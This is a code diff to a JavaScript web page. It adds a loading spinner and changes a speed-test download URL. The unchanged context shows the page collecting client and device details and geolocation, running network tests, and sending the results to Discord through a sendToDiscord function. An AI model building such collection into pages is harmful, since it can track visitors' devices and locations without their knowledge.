@@ -8,7 +8,12 @@ function safeStringify(obj) {
 }
 const statusEl = () => document.getElementById('status');
 const outputEl = () => document.getElementById('output');
+const spinner = () => document.getElementById('spinner');
 const btn = document.getElementById('logBtn');
+
+function showSpinner(show) {
+  spinner().style.display = show ? 'block' : 'none';
+}
 
 // Collect client info + device details
 function collectClientInfo() {
@@ -41,7 +46,6 @@ async function fetchGeo() {
 }
 
 // --- Network tests ---
-// Ping test: average of 3 small fetches
 async function testPing() {
   const url = "https://www.cloudflare.com/cdn-cgi/trace";
   const attempts = 3;
@@ -55,9 +59,8 @@ async function testPing() {
   return Math.round(avg);
 }
 
-// Download speed test: fetch ~5MB from Cloudflare
 async function testDownload() {
-  const url = "https://speed.cloudflare.com/__down?bytes=5000000"; // 5MB
+  const url = "https://openspeedtest.com/speedtest/random4000x4000.jpg";
   const start = performance.now();
   const res = await fetch(url, { cache: "no-store" });
   const blob = await res.blob();
@@ -102,6 +105,7 @@ async function sendToDiscord(payload) {
 // --- Main flow ---
 btn.addEventListener('click', async () => {
   btn.disabled = true;
+  showSpinner(true);
   statusEl().textContent = 'Collecting...';
   try {
     const client = collectClientInfo();
@@ -137,5 +141,6 @@ btn.addEventListener('click', async () => {
     outputEl().textContent = 'Error: ' + err.message;
   } finally {
     btn.disabled = false;
+    showSpinner(false);
   }
 });
